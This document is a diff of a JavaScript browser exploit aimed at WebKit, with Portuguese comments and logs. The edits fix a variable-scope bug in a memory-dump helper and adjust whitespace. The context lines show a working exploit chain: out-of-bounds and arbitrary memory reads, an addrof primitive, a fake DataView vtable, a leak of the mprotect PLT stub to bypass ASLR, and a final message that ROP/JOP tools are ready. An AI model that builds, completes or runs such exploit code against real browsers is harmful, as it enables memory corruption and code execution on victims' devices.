@@ -50,7 +50,8 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        let hexLine = address.add(i + j).toString(16).padStart(2, '0') + " "; // Corrigido aqui
+        // CORREÇÃO AQUI: 'j' não estava no escopo, use apenas 'i' para o início da linha.
+        let hexLine = address.add(i).toString(16).padStart(2, '0') + " ";
         let asciiLine = "  ";
         let rowBytes = [];
 
@@ -69,7 +70,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
                     break;
                 }
             } else {
-                hexLine += "   ";
+                hexLine += "   "; // Ajustado o espaçamento para consistência
                 asciiLine += " ";
             }
         }
@@ -328,7 +329,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let found_m_mode = null;
 
     // Declaração da variável fora do try/catch para evitar redeclaração
-    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null;    
 
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -458,7 +459,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
                 logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
             } else {
-                 logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
+                logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
             }
             await pauseFn(LOCAL_MEDIUM_PAUSE);
 
@@ -518,7 +519,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
                 logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
             } else {
-                 logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+                logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
             }
 
             logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
